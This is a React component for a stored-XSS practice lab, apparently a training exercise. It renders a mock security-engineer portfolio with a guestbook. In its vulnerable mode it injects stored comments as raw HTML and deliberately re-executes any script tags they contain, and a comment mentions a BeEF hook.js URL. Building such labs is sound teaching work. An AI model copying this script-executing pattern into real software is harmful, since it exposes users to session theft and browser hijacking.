import React, { useState, useEffect, useRef } from 'react';
import { 
  MessageSquare, 
  Send, 
  User, 
  MapPin, 
  Mail, 
  Globe, 
  Terminal, 
  Code2, 
  ShieldCheck, 
  ExternalLink,
  RotateCcw,
  Sparkles,
  CheckCircle2
} from 'lucide-react';

export function XssCommunityLab({ isSecure }) {
  const [comments, setComments] = useState([]);
  const [authorName, setAuthorName] = useState('');
  const [commentText, setCommentText] = useState('');
  const [loadingComments, setLoadingComments] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [submitMessage, setSubmitMessage] = useState(null);
  const [resetting, setResetting] = useState(false);
  const [resetMessage, setResetMessage] = useState(null);

  const commentsContainerRef = useRef(null);

  // Fetch comments from backend MySQL database
  const fetchComments = async () => {
    setLoadingComments(true);
    try {
      const res = await fetch('http://127.0.0.1:3001/api/xss/comments');
      const data = await res.json();
      if (data.success && data.comments) {
        setComments(data.comments);
      }
    } catch (err) {
      console.error('Failed to load guestbook comments:', err);
    } finally {
      setLoadingComments(false);
    }
  };

  useEffect(() => {
    // Check if the page just completed a reset
    if (sessionStorage.getItem('xss_lab_reset_done') === 'true') {
      sessionStorage.removeItem('xss_lab_reset_done');
      setResetMessage('Website successfully restored to normal! All malicious scripts, BeEF hooks, and comments have been cleared from the database.');
      setTimeout(() => setResetMessage(null), 6000);
    }
    fetchComments();
  }, []);

  // Ensure injected <script> and HTML tags execute in vulnerable mode
  useEffect(() => {
    if (!isSecure && commentsContainerRef.current) {
      // 1. Execute <script> tags (both inline scripts and external scripts like Kali BeEF hook.js)
      const scripts = commentsContainerRef.current.querySelectorAll('script');
      scripts.forEach(s => {
        if (!s.dataset.executed) {
          s.dataset.executed = 'true';
          try {
            // Create a real DOM script element to trigger browser execution and network fetching
            const newScript = document.createElement('script');
            
            // Copy all attributes (src, type, async, defer, etc.)
            Array.from(s.attributes).forEach(attr => {
              newScript.setAttribute(attr.name, attr.value);
            });

            if (s.src) {
              // External script (e.g. BeEF hook: <script src="http://127.0.0.1:3000/hook.js"></script>)
              newScript.src = s.src;
              newScript.async = true;
            } else {
              // Inline script (e.g. <script>alert("hallo user")</script>)
              newScript.textContent = s.textContent || s.innerText || '';
            }

            // Appending to document.head forces the browser to immediately fetch and execute the script
            document.head.appendChild(newScript);
          } catch (err) {
            console.warn('XSS script execution error:', err);
          }
        }
      });

      // 2. Also handle custom <alert>...</alert> if someone types <alert>text</alert>
      const customAlerts = commentsContainerRef.current.querySelectorAll('alert');
      customAlerts.forEach(el => {
        if (!el.dataset.executed) {
          el.dataset.executed = 'true';
          try {
            alert(el.textContent || el.innerText);
          } catch (err) {
            console.warn('Alert error:', err);
          }
        }
      });
    }
  }, [comments, isSecure]);

  // Post new comment to MySQL
  const handlePostComment = async (e) => {
    e.preventDefault();
    if (!commentText.trim()) return;

    setSubmitting(true);
    try {
      const res = await fetch('http://127.0.0.1:3001/api/xss/comments', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: authorName.trim() || 'Visitor',
          comment: commentText
        })
      });

      const data = await res.json();
      if (data.success && data.comment) {
        // Immediately append to local state
        setComments(prev => [...prev, data.comment]);
        setCommentText('');
        setAuthorName('');
        setSubmitMessage(`Comment saved to MySQL database (Table: 'comments', ID #${data.comment.id})!`);
        setTimeout(() => setSubmitMessage(null), 4000);
        await fetchComments();
      }
    } catch (err) {
      console.error('Comment submission error:', err);
    } finally {
      setSubmitting(false);
    }
  };

  // Complete Reset: Clears MySQL comments, terminates BeEF hooks, clears DOM defacements & reloads to normal
  const handleResetWebsiteToNormal = async () => {
    setResetting(true);
    try {
      // 1. Reset MySQL database: deletes all malicious comments and restores default clean baseline
      await fetch('http://127.0.0.1:3001/api/xss/comments', { method: 'DELETE' });

      // 2. Remove all injected scripts from DOM
      const scripts = document.querySelectorAll('script[src*="hook.js"], script[data-executed="true"]');
      scripts.forEach(s => s.remove());

      // 3. Clear any CSS defacements on body/html
      document.body.style.filter = '';
      document.body.style.backgroundColor = '';
      document.body.style.color = '';

      // 4. Set session flag and reload page so all memory/timers/BeEF loops are 100% destroyed
      sessionStorage.setItem('xss_lab_reset_done', 'true');
      window.location.reload();
    } catch (err) {
      console.error('Reset error:', err);
      setResetting(false);
      alert('Failed to reset website. Please verify backend connection.');
    }
  };

  // Skills List
  const skills = [
    'Application Security',
    'Full-Stack Architecture (React & Node)',
    'Penetration Testing',
    'MySQL & Database Hardening',
    'Cloud Security (AWS / GCP)',
    'Zero-Trust Authentication',
    'Threat Modeling',
    'Docker & Container Security',
    'OWASP Top 10 Mitigation'
  ];

  // Featured Engineering Projects
  const projects = [
    {
      title: 'CloudShield Sentinel',
      desc: 'Automated continuous vulnerability scanner and configuration auditor for containerized cloud environments.',
      tags: ['Node.js', 'Docker', 'AWS', 'Security Audit']
    },
    {
      title: 'VaultKey Identity Engine',
      desc: 'Zero-Trust decentralized identity authentication service with biometric credentials and FIDO2 integration.',
      tags: ['React', 'TypeScript', 'Cryptography', 'OAuth2']
    },
    {
      title: 'Defensive API Blueprint',
      desc: 'High-throughput enterprise API framework designed with built-in parameterization and defense-in-depth sanitization.',
      tags: ['Express', 'MySQL', 'JWT', 'AppSec']
    }
  ];

  return (
    <div className="lab-container" style={{ padding: '20px 16px' }}>
      <div className="portfolio-wrapper">
        {/* ===================================================================
            TOP LAB UTILITY BAR: FAST RESET TO NORMAL
            =================================================================== */}
        <div className="lab-utility-bar">
          <div className="lab-utility-status">
            <span className="live-dot"></span>
            <span style={{ fontWeight: 600, color: 'var(--text-primary)' }}>Live Scenario:</span>
            <span>Abdul Waheed Portfolio & Guestbook (Stored XSS Target)</span>
          </div>

          <button 
            type="button" 
            className="reset-lab-btn"
            onClick={handleResetWebsiteToNormal}
            disabled={resetting}
            title="Clean all injected payloads, terminate BeEF hooks, and restore normal website"
          >
            <RotateCcw size={14} className={resetting ? "spinning" : ""} />
            <span>{resetting ? 'Restoring Normal Website...' : 'Reset Website to Normal'}</span>
          </button>
        </div>

        {/* Global Reset Notification Toast */}
        {resetMessage && (
          <div className="auth-notification success" style={{ marginBottom: '18px' }}>
            <CheckCircle2 size={16} />
            <span>{resetMessage}</span>
          </div>
        )}

        {/* ===================================================================
            SECTION 1: HERO & PROFILE
            =================================================================== */}
        <div className="portfolio-card">
          <div className="portfolio-hero-row">
            <div className="portfolio-avatar">
              AW
            </div>

            <div style={{ flex: 1, minWidth: '240px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap', marginBottom: '6px' }}>
                <h1 className="portfolio-name">Abdul Waheed</h1>
                <span className="portfolio-badge">
                  <span style={{ width: '6px', height: '6px', borderRadius: '50%', background: '#00ff9d', display: 'inline-block' }}></span>
                  Open for Security Audits & Consulting
                </span>
              </div>
              <p style={{ color: 'var(--cyan)', fontSize: '15px', fontWeight: '600', marginBottom: '8px' }}>
                Senior Full-Stack & Application Security Engineer
              </p>
            </div>
          </div>

          <p className="portfolio-bio">
            Specializing in web application architecture, offensive security testing, and defensive software engineering. 
            Over 7 years of experience helping engineering teams design resilient cloud applications, perform rigorous penetration testing, 
            and eliminate critical vulnerabilities across the modern software stack.
          </p>

          <div className="portfolio-meta-bar">
            <div className="portfolio-meta-chip">
              <MapPin size={14} style={{ color: 'var(--cyan)' }} />
              <span>San Francisco, CA & Remote</span>
            </div>
            <div className="portfolio-meta-chip">
              <Mail size={14} style={{ color: 'var(--cyan)' }} />
              <span>abdul@gmail.com</span>
            </div>
            <div className="portfolio-meta-chip">
              <Terminal size={14} style={{ color: 'var(--cyan)' }} />
              <span>github.com/abdulwaheed-sec</span>
            </div>
            <div className="portfolio-meta-chip">
              <Globe size={14} style={{ color: 'var(--cyan)' }} />
              <span>linkedin.com/in/abdulwaheed-sec</span>
            </div>
          </div>

          {/* Core Technical Arsenal */}
          <h2 className="portfolio-section-heading">
            <Code2 size={20} style={{ color: 'var(--cyan)' }} />
            Technical Arsenal & Core Competencies
          </h2>
          <div className="skills-tags-wrap">
            {skills.map((s, idx) => (
              <span key={idx} className="skill-tag-pill">
                {s}
              </span>
            ))}
          </div>

          {/* Featured Works */}
          <h2 className="portfolio-section-heading">
            <ShieldCheck size={20} style={{ color: 'var(--cyan)' }} />
            Featured Engineering Projects
          </h2>
          <div className="portfolio-projects-grid">
            {projects.map((proj, idx) => (
              <div key={idx} className="portfolio-project-card">
                <div>
                  <h3 className="project-card-title">{proj.title}</h3>
                  <p className="project-card-desc">{proj.desc}</p>
                </div>
                <div className="project-tags-row">
                  {proj.tags.map((t, tIdx) => (
                    <span key={tIdx} className="project-mini-tag">{t}</span>
                  ))}
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* ===================================================================
            SECTION 2: GUESTBOOK & RECOMMENDATIONS (STORED XSS VULNERABILITY)
            =================================================================== */}
        <div className="guestbook-section-card">
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '12px', marginBottom: '20px' }}>
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                <div style={{ width: '36px', height: '36px', borderRadius: '10px', background: 'rgba(0, 229, 255, 0.15)', display: 'flex', alignItems: 'center', justifyContent: 'center', color: 'var(--cyan)' }}>
                  <MessageSquare size={20} />
                </div>
                <h2 style={{ fontSize: '20px', fontWeight: '800', color: 'var(--text-primary)', margin: 0 }}>
                  Guestbook & Endorsements
                </h2>
              </div>
              <p style={{ fontSize: '13.5px', color: 'var(--text-secondary)', marginTop: '4px' }}>
                Colleagues, clients, and collaborators are welcome to leave public endorsements for Abdul below.
              </p>
            </div>

            <button 
              type="button" 
              className="reset-lab-btn"
              onClick={handleResetWebsiteToNormal}
              disabled={resetting}
              title="Clean all injected payloads, terminate BeEF hooks, and restore normal website"
            >
              <RotateCcw size={14} className={resetting ? "spinning" : ""} />
              <span>{resetting ? 'Restoring...' : 'Reset Website to Normal'}</span>
            </button>
          </div>

          {/* Submission Feedback Toast */}
          {submitMessage && (
            <div className="auth-notification success" style={{ marginBottom: '18px' }}>
              <Sparkles size={16} />
              <span>{submitMessage}</span>
            </div>
          )}

          {/* Clean Testimonial Submission Form */}
          <form onSubmit={handlePostComment} className="guestbook-form-box">
            <div style={{ marginBottom: '14px' }}>
              <label className="auth-label" htmlFor="guestName">
                Your Name & Title
              </label>
              <input 
                id="guestName"
                type="text" 
                className="auth-input" 
                value={authorName}
                onChange={(e) => setAuthorName(e.target.value)}
                placeholder="e.g. Sarah Chen (Lead Architect at CloudScale)"
                required
              />
            </div>

            <div style={{ marginBottom: '16px' }}>
              <label className="auth-label" htmlFor="guestComment">
                Your Endorsement or Comment
              </label>
              <textarea 
                id="guestComment"
                className="auth-input" 
                style={{ minHeight: '95px', resize: 'vertical' }}
                value={commentText}
                onChange={(e) => setCommentText(e.target.value)}
                placeholder="Write your recommendation, feedback, or message here..."
                required
              />
            </div>

            <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
              <button 
                type="submit" 
                className="auth-submit-btn" 
                style={{ width: 'auto', padding: '10px 24px' }}
                disabled={submitting}
              >
                <Send size={15} />
                {submitting ? 'Submitting...' : 'Post Endorsement'}
              </button>
            </div>
          </form>

          {/* Testimonials List (Vulnerable Stored XSS Sink) */}
          <div ref={commentsContainerRef} className="guestbook-comments-list">
            {loadingComments ? (
              <div style={{ padding: '40px', textAlign: 'center', color: 'var(--text-secondary)' }}>
                Loading endorsements...
              </div>
            ) : comments.length === 0 ? (
              <div style={{ padding: '40px', textAlign: 'center', color: 'var(--text-muted)' }}>
                No endorsements posted yet. Be the first to leave a message!
              </div>
            ) : (
              comments.map((c) => {
                const initial = (c.username || 'V').charAt(0).toUpperCase();
                const formattedDate = c.created_at ? new Date(c.created_at).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }) : 'Recent';

                return (
                  <div key={c.id} className="testimonial-item">
                    <div className="testimonial-top-row">
                      <div className="testimonial-author-wrap">
                        <div className="testimonial-avatar-initial">
                          {initial}
                        </div>
                        <div>
                          <div className="testimonial-author-name">{c.username}</div>
                          <div className="testimonial-date-text">{formattedDate}</div>
                        </div>
                      </div>
                    </div>

                    {/* VULNERABLE STORED XSS RENDERING */}
                    {!isSecure ? (
                      <div className="testimonial-body-text">
                        {/* 1. Raw HTML inserted into DOM (Inspect Element will show the real <script> tag and link) */}
                        <div 
                          className="stored-xss-sink"
                          dangerouslySetInnerHTML={{ __html: c.comment }} 
                        />
                        {/* 2. If the comment has no visible text (e.g. only <script> tags), show a styled code box so the card isn't an empty blank line */}
                        {c.comment.replace(/<[^>]*>/g, '').trim() === '' && (
                          <div 
                            style={{
                              marginTop: '8px',
                              fontFamily: 'monospace',
                              fontSize: '12.5px',
                              color: '#00e5ff',
                              background: 'rgba(0, 229, 255, 0.08)',
                              padding: '8px 12px',
                              borderRadius: '6px',
                              border: '1px dashed rgba(0, 229, 255, 0.3)',
                              wordBreak: 'break-all'
                            }}
                          >
                            <span style={{ color: '#ffb86c', fontWeight: 'bold' }}>[Stored Payload]: </span>
                            <code>{c.comment}</code>
                          </div>
                        )}
                      </div>
                    ) : (
                      <div className="testimonial-body-text">
                        {c.comment}
                      </div>
                    )}
                  </div>
                );
              })
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
